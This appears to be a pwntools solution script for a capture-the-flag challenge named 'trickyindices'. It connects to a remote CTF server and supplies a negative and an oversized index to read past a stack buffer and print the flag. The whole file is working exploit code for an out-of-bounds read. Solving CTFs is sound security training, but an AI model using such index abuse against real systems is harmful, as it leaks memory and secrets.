#!/bin/python
from pwn import *
#target = process ("./trickyindices")
target = remote ("forever.isss.io", 1301)

target.recvline() # Input a string:
target.sendline(b"a") # value is unimportant

target.recvline() # Input a first index:
target.sendline(b"-150") # is a negative number as its above the input string on the stack

target.recvline() # Input a second index:
target.sendline(b"5000") # must be a big number


target.recvline() # dose not contain flag, no need to print
flag = "utflag"+str(target.recvline().strip()).replace("\'", "").split("utflag", 1)[1]
print(flag)
